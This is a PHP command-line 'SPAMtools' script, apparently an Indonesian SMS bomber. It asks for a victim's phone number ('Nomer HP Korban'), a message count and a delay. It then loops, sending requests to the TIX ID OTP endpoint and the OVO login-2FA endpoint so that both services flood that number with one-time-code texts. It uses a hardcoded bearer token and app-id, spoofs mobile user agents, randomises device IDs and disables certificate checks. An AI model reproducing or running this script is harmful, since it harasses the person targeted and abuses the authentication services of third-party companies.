 <?php

// TIX ID
$tixid = array();
$tixid[] = 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJtc2lzZG4iOiIiLCJ1c2VyX2lkIjoiIiwicHVycG9zZSI6Im5vdGxvZ2luIiwiYXVkIjoiVGl4SUQgTWlkZGxld2FyZSIsImV4cCI6MTU2NTg5MDMxMiwiaWF0IjoxNTU3MjUwMzEyLCJpc3MiOiJUaXhJRCBTZWN1cml0eSBBdXRob3JpdHkiLCJzdWIiOiJNb2JpbGUgYXV0aG9yaXphdGlvbiB0b2tlbiJ9.2OXxPRGeMb8hwuMc12uJVr4Kxlp98RVg-vNl6haTXv8';
$tixid[] = 'Content-Type: application/json';
$tixid[] = 'Connection: Keep-Alive';
$tixid[] = 'User-Agent: okhttp/3.9.0';

// OVO
$device = "752fad89-60f5-3b3f-a6ee-a50d2804".rand(0000,9999);
$ovo = array();
$ovo[] = 'Content-Type: application/json';
$ovo[] = 'App-Version: 2.9.1';
$ovo[] = 'app-id: C7UMRSMFRZ46D9GW9IK7';
$ovo[] = 'Connection: Keep-Alive';
$ovo[] = 'cs-session-id: ';
$ovo[] = 'OS: Android';
$ovo[] = 'User-Agent: okhttp/3.11.0';

// EKSE
echo  "==================XXxxXx==================\n";
echo "Instagram= @nuhaaramdan\n";
echo "=================SPAMtools";
echo "==================\n";
echo "Nomer HP Korban: ";
$number = trim(fgets(STDIN));
$numbers2 = $number;
$numbers = $number[0].$number[1];
if($numbers == "08") {
 $number = str_replace("08","+628",$number);
}
echo "Jumlah SMS: ";
$qty = trim(fgets(STDIN));
echo "Delay (detik): ";
$delay = trim(fgets(STDIN));
echo "\n";

for ($i=1; $i < $qty; $i++) {
 $user = curl('https://api.tix.id:443/v1/otp/send_otp', '{"device_os":"android","msisdn":"'.$number.'"}', $tixid);
 $user1 = curl('https://api.ovo.id/v2.0/api/auth/customer/login2FA', '{"deviceId":"'.$device.'","mobile":"'.$numbers2.'"}', $ovo);
 sleep($delay);
 echo "SUKSES ".$i." SMS\n";
}

function curl($url, $fields = null, $headers = null)
    {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        if ($fields !== null) {
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $fields);
        }
        if ($headers !== null) {
            curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
        }
        $result   = curl_exec($ch);
        $httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
      
        return array(
            $result,
            $httpcode
        );
 }
